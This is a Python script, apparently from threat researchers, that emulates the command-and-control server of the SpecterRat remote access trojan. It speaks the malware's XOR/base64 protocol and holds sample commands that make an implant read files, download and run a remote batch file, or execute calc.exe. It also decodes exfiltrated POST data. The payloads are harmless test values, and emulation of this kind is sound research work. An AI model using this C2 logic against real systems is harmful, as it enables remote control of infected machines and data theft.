# SpecterRat C2 Emulator
# (C) SilentPush
import http.server
import socketserver
import base64
import urllib
import re


def tokenize_and_check(string):
    pattern = re.compile(r'(@|\[@\])')
    tokens = pattern.split(string)
    filtered_tokens = [token.strip() for token in tokens if token.strip() and token not in ('@', '[@]')]

    for token in filtered_tokens:
        print(token)

def extract_post_param(post_data, param_name):
    if isinstance(post_data, bytes):
        post_data = post_data.decode('utf-8')

    pattern = re.compile(rf"{param_name}=([^&]+)")
    match = pattern.search(post_data)

    if match:
        return match.group(1)
    else:
        return None


def xor_encrypt(data, key):
    modified_key = bytes([ord(k) & 10 for k in key])
    encrypted_data = bytes([a ^ modified_key[i % len(modified_key)] for i, a in enumerate(data)])

    return encrypted_data


def base64_encode(data):
    # Base64 encode the data
    encoded_data = base64.b64encode(data)

    return encoded_data

def encode_data(data, xorkey):
    if isinstance(data, str):
        data = data.encode()

    encrypted_data = xor_encrypt(data, xorkey)
    encoded_data = base64_encode(encrypted_data)

    return encoded_data.decode("utf-8")


def decode_data(data, xorkey):
    decoded_data = base64.urlsafe_b64decode(urllib.parse.unquote(data))

    # XOR decrypt the data
    decrypted_data = xor_encrypt(decoded_data, xorkey)

    return decrypted_data.decode("utf-8")


class MyHandler(http.server.SimpleHTTPRequestHandler):
    xorkey = "B59F48C7F467D996F7E173D125151E"

    def do_GET(self):
        if self.path == "/v9/vxrb.php?wber=6":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"trxu")
        elif self.path == "/v9/vxrb.php?wber=31":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"trxu")
        elif "wber=1" in self.path:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            # data = "1|C:\\Users\\Administrator\\Desktop\\hello.txt"
            # data = "2|20*20*20*https://filesamples.com/samples/code/bat/ascii_to_unicode.bat"
            # data = "3|3*sample.rar"
            # data = "9|pythonw.exe"
            # data = "10|"
            # data = "13|google.com"
            
            data = "14|10*Y2FsYy5leGU="
            
            # data = "15|10*Y2FsYy5leGU=" # Info
            # data = "16|10@https://filesamples.com/samples/code/bat/ascii_to_unicode.bat" # Info

            encoded = encode_data(data, self.xorkey)
            print(encoded)
            
            self.wfile.write(encoded.encode("utf-8"))
        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

    def do_POST(self):
            content_length = int(self.headers['Content-Length'])  # Get the size of the data
            if content_length == 0:
                return 

            post_data = self.rfile.read(content_length)  # Read the data
            print ("POST data: %s" % post_data)
            post_data = extract_post_param(post_data, "lhpg")

            if post_data != None:
                # print ("POST data: %s" % post_data)
                # print("POST data received:", decode_data(post_data, self.xorkey))  # Print the data
                tokenize_and_check(decode_data(post_data, self.xorkey))

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()


PORT = 80
Handler = MyHandler


with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving on port {PORT}")
    httpd.serve_forever()
